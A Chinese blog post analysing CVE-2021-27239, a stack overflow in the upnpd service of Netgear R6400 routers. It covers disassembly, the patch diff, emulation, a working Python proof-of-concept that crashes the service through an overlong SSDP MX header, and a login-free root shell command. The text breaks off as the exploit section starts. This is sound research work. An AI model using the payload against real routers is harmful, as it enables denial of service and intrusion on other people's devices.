<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="have a nice day">
<meta property="og:url" content="http://21guns.top/page/10/index.html">
<meta property="og:site_name" content="have a nice day">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="have a nice day">

<link rel="canonical" href="http://21guns.top/page/10/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>have a nice day</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">have a nice day</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/03/31/iot/netgear r6400v2漏洞定位及分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/31/iot/netgear r6400v2漏洞定位及分析/" class="post-title-link" itemprop="url">netgear r6400/v2漏洞定位及分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-31 14:41:33" itemprop="dateCreated datePublished" datetime="2021-03-31T14:41:33+08:00">2021-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-22 09:19:23" itemprop="dateModified" datetime="2022-02-22T09:19:23+08:00">2022-02-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="netgear-r6400-v2漏洞定位及分析"><a href="#netgear-r6400-v2漏洞定位及分析" class="headerlink" title="netgear-r6400/v2漏洞定位及分析"></a>netgear-r6400/v2漏洞定位及分析</h1><p>CVE-2021-27239-netgear-r6400/v2</p>
<blockquote>
<p>CVE-2021-27239-netgear-r6400/v2基于UDP的1900端口、upnpd服务、内网、ssdp的mx头、栈溢出、无需认证、root权限</p>
</blockquote>
<h2 id="通告"><a href="#通告" class="headerlink" title="通告"></a>通告</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-206/</span></span><br><span class="line">his vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6400 and R6700 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the upnpd service, <span class="built_in">which</span> listens on UDP port 1900 by default. A crafted MX header field <span class="keyword">in</span> an SSDP message can trigger an overflow of a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>官网</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://kb.netgear.com/000062820/Security-Advisory-for-Stack-based-Buffer-Overflow-Remote-Code-Execution-Vulnerability-on-Some-Routers-PSV-2020-0432</span></span><br><span class="line">R6400 running firmware versions prior to 1.0.1.68</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.netgear.com/support/product/R6400.aspx#download</span></span><br><span class="line">70、68、62</span><br><span class="line"></span><br><span class="line"><span class="comment"># fofa</span></span><br><span class="line">app=<span class="string">"NETGEAR-R6400"</span></span><br><span class="line">18,742 条匹配结果 (9,306 条独立IP)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间</span></span><br><span class="line">2020-09-23 - Vulnerability reported to vendor</span><br><span class="line">62：Last Updated:08/03/2020</span><br><span class="line">68:Last Updated:01/18/2021</span><br><span class="line">70:Last Updated:03/15/2021</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故对比：62 &amp; 68</span></span><br></pre></td></tr></table></figure>
<ul>
<li>开启telnet</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># telnetd失败</span></span><br><span class="line"> lxl@MBP  ~  telnet 192.168.10.1</span><br><span class="line">Trying 192.168.10.1...</span><br><span class="line">Connected to 192.168.10.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line"></span><br><span class="line"><span class="comment"># utelnetd成功</span></span><br><span class="line"> ✘ lxl@MBP  ~  telnet 192.168.10.1</span><br><span class="line">Trying 192.168.10.1...</span><br><span class="line">Connected to 192.168.10.1.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">login: admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无需多余的参数，默认即可</span></span><br><span class="line"><span class="comment"># ps |grep telnet</span></span><br><span class="line">16052 admin       652 S   utelnetd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">无参数，需要登录</span><br><span class="line">-l /bin/sh，无需登录</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最好后台执行</span></span><br><span class="line">utelnetd -l /bin/sh &amp;</span><br><span class="line">若前台执行会一直等待执行完</span><br></pre></td></tr></table></figure>
<ul>
<li>获取web密码</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nvram show |grep http_</span></span><br><span class="line">size: 40713 bytes (90359 left)</span><br><span class="line">http_username=admin</span><br><span class="line">http_passwd=admin</span><br></pre></td></tr></table></figure>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul>
<li>过程</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 通告中：SSDP消息中的MX头字段</span><br><span class="line">.rodata:0003E848 aMx             DCB &quot;MX:&quot;,0             ; DATA XREF: my_vulnee+28↑o</span><br><span class="line"># 交叉引用找到sub_21078</span><br><span class="line">.text:00021078 my_vulnee                               ; CODE XREF: sub_22038+188↓p</span><br><span class="line">.text:00021078</span><br><span class="line">.text:00021078 var_90          = -0x90</span><br><span class="line">.text:00021078 str             = -0x8C</span><br><span class="line">.text:00021078</span><br><span class="line">.text:00021078                 PUSH            &#123;R4-R6,LR&#125;</span><br><span class="line">.text:0002107C                 MOV             R4, #0</span><br><span class="line">.text:00021080                 SUB             SP, SP, #0x80</span><br><span class="line">.text:00021084                 MOV             R5, R0  ; 参数1，请求</span><br><span class="line">.text:00021088                 MOV             R1, R4  ; c</span><br><span class="line">.text:0002108C                 MOV             R2, #0x7C ; &apos;|&apos; ; n</span><br><span class="line">.text:00021090                 ADD             R0, SP, #0x90+str ; s</span><br><span class="line">.text:00021094                 STR             R4, [SP,#0x90+var_90]</span><br><span class="line">.text:00021098                 BL              memset</span><br><span class="line">.text:0002109C                 MOV             R0, R5</span><br><span class="line">.text:000210A0                 LDR             R1, =aMx ; &quot;MX:&quot;</span><br><span class="line">.text:000210A4                 BL              stristr ; 从请求内容中找到MX头</span><br><span class="line">.text:000210A8                 SUBS            R5, R0, #0</span><br><span class="line">.text:000210AC                 BEQ             loc_21114</span><br><span class="line">.text:000210B0                 LDR             R1, =(aSetsockopt1+0xC) ; &quot;\r\n&quot;</span><br><span class="line">.text:000210B4                 BL              stristr ; 从mx头中找其结尾</span><br><span class="line">.text:000210B8                 SUBS            R6, R0, #0 ; 尾部位置</span><br><span class="line">.text:000210BC                 BEQ             loc_21120</span><br><span class="line">.text:000210C0                 ADD             R1, R5, #3 ; 跳过&quot;mx:&quot;，取值，作为src</span><br><span class="line">.text:000210C4                 CMP             R6, R1</span><br><span class="line">.text:000210C8                 BLS             loc_21104</span><br><span class="line">.text:000210CC                 RSB             R2, R1, R6 ; 尾部-首部，作为n</span><br><span class="line">.text:000210CC                                         ; 如此控制大小n，形同虚设，mx:1234，n=4</span><br><span class="line">.text:000210D0                 MOV             R0, SP  ; 栈空间，作为dest</span><br><span class="line">.text:000210D4                 BL              strncpy ; overflow！</span><br><span class="line"></span><br><span class="line"># bindiff</span><br><span class="line">0.9867301027026377	0.9899582273570628	00021078	sub_00021078	Normal	000210B8	sub_000210B8	Normal</span><br></pre></td></tr></table></figure>
<ul>
<li>如何修复</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧，v62，尽管是strncpy，但控制n的方法白给</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">my_vulnee</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> dst_buff; <span class="comment">// [sp+0h] [bp-90h] BYREF 尽管非局部数组，也是局部指针，其指向内存空间在栈</span></span><br><span class="line"></span><br><span class="line">  mx_header = stristr(a1, <span class="string">"MX:"</span>);</span><br><span class="line">  mx_header_1 = mx_header;</span><br><span class="line">  <span class="keyword">if</span> ( !mx_header || (mx_end = stristr(mx_header, <span class="string">"\r\n"</span>)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nullsub_1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( mx_end &lt;= mx_header_1 + <span class="number">3</span> )              <span class="comment">// +3跳过"MX:"</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dst_buff, (mx_header_1 + <span class="number">3</span>), &amp;mx_end[-mx_header_1 - <span class="number">3</span>]);<span class="comment">// overflow</span></span><br><span class="line">                                                <span class="comment">// -mx_header_1 - 3 = - (mx_header_1 + 3)</span></span><br><span class="line">                                                <span class="comment">// 尾部位置-首部位置，即此mx的len</span></span><br><span class="line">                                                <span class="comment">// 如此控制n，形同虚设</span></span><br><span class="line"><span class="comment">// 新，v68，对n限制大小</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">sub_210B8</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mx_header = stristr(a1, <span class="string">"MX:"</span>);</span><br><span class="line">  mx_header_1 = mx_header;</span><br><span class="line">  <span class="keyword">if</span> ( !mx_header || (mx_end = stristr(mx_header, <span class="string">"\r\n"</span>)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nullsub_1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mx_begin = (mx_header_1 + <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mx_end &lt;= mx_header_1 + <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  mx_len = mx_end - mx_begin;</span><br><span class="line">  <span class="keyword">if</span> ( (mx_end - mx_begin) &gt;= <span class="number">127</span> )             <span class="comment">// 强行对n限制，最大127</span></span><br><span class="line">    mx_len = <span class="number">127</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dst_buff, mx_begin, mx_len);</span><br></pre></td></tr></table></figure>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>设置最小长度以显示”MX:”字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ida中明明有"MX:"字符串，但strings窗口中没有</span></span><br><span class="line">.rodata:0003E848 aMx             DCB <span class="string">"MX:"</span>,0</span><br><span class="line"><span class="comment"># strings工具也没有</span></span><br><span class="line">strings upnpd-62 | grep MX</span><br><span class="line"></span><br><span class="line"><span class="comment"># stings工具：需要指定最小长度，-n 3，默认是4</span></span><br><span class="line">$ strings upnpd-62 -n 3 | grep MX</span><br><span class="line">MX:</span><br><span class="line"></span><br><span class="line"><span class="comment"># ida中：strings窗口右键、setup、修改minimal string length为3，默认5</span></span><br><span class="line">.rodata:0003E848	00000004	C	MX:</span><br></pre></td></tr></table></figure>
<ul>
<li>注意漏洞描述是TCP 还是 UDP，以及相应端口号！！！</li>
<li>123</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 怎么区分各种arm版本</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">arm      arm_any  armv2    armv2a   armv3    armv3m   armv4    armv4t   armv5    armv5t   armv5te</span><br></pre></td></tr></table></figure>
<h2 id="程序执行"><a href="#程序执行" class="headerlink" title="程序执行"></a>程序执行</h2><ul>
<li>模拟执行：利用qemu-system-arm，qemu_arm虚拟机</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现：https://paper.seebug.org/1311/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改nvram.ini（其它默认没改</span></span><br><span class="line">lan_ipaddr=10.10.10.2</span><br><span class="line">lan_hwaddr=52:54:00:12:34:56</span><br><span class="line">hwver=R8500<span class="comment"># 没改，实测无影响</span></span><br><span class="line">friendly_name=R8300<span class="comment"># 没改，实测无影响</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/custom_nvram_r6250.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line"><span class="comment"># ps</span></span><br><span class="line"> 2472 0          2864 S   /usr/sbin/upnpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 是基于UDP的1900端口，切莫搞错</span></span><br><span class="line"><span class="comment"># /tmp/busybox-armv7l netstat -atp（错误）</span></span><br><span class="line">tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      2472/upnpd</span><br><span class="line"><span class="comment"># /tmp/busybox-armv7l netstat -aup （正确）</span></span><br><span class="line">udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2801/upnpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无法http访问</span></span><br><span class="line">http://10.10.10.2:1900/<span class="comment"># 错误，http基于tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 无法端口转发，只能本子网中实验</span></span><br><span class="line">ssh -L 9000:10.10.10.2:1900 192.168.142.188<span class="comment"># 错误，udp端口不能用ssh来转发，因为ssh基于tcp的</span></span><br></pre></td></tr></table></figure>
<ul>
<li>手头有R6400v2的设备，二者硬件环境应该相似，直接将upnpd拷进去执行即可，免得模拟</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 拷贝至设备</span></span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line">wget http://192.168.10.2:8000/upnpd-62</span><br><span class="line">chmod +x upnpd-62</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 kill原有的</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"> 9461 admin      4364 S   upnpd</span><br><span class="line">15140 admin      2900 S   grep upnpd</span><br><span class="line"><span class="comment"># killall upnpd</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15325 admin      2876 D   grep upnpd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 成功执行</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15325 admin      2876 D   grep upnpd</span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15717 admin      2492 S   ./upnpd-62</span><br><span class="line">15721 admin      2892 R   grep upnpd</span><br></pre></td></tr></table></figure>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考</span></span><br><span class="line">google:python 组播</span><br><span class="line">https://www.cnblogs.com/lsdb/p/<span class="number">9408947.</span>html</span><br><span class="line"></span><br><span class="line"><span class="comment"># poc.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">mcast_group_ip = <span class="string">'192.168.10.1'</span></span><br><span class="line">mcast_group_port = <span class="number">1900</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sender</span><span class="params">()</span>:</span></span><br><span class="line">    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)</span><br><span class="line">    send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="number">2</span>)</span><br><span class="line">    message = <span class="string">'M-SEARCH * HTTP/1.1\r\nST: ssdp:discover\r\nMX: 33333333333333333333333333333333333333333333333333333333333333333333333333\r\nMAN: "ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n'</span></span><br><span class="line">    send_sock.sendto(message.encode(), (mcast_group_ip, mcast_group_port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sender()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行后，程序被打死</span></span><br><span class="line">python3 poc.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"><span class="number">15717</span> admin      <span class="number">2492</span> S   ./upnpd<span class="number">-62</span></span><br><span class="line"><span class="number">15721</span> admin      <span class="number">2892</span> R   grep upnpd</span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"><span class="number">16104</span> admin      <span class="number">2876</span> R   grep upnpd</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><ul>
<li>远程调试</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看目标架构</span></span><br><span class="line">file upnpd-62</span><br><span class="line">upnpd-62: ELF 32-bit LSB executable, ARM, EABI5 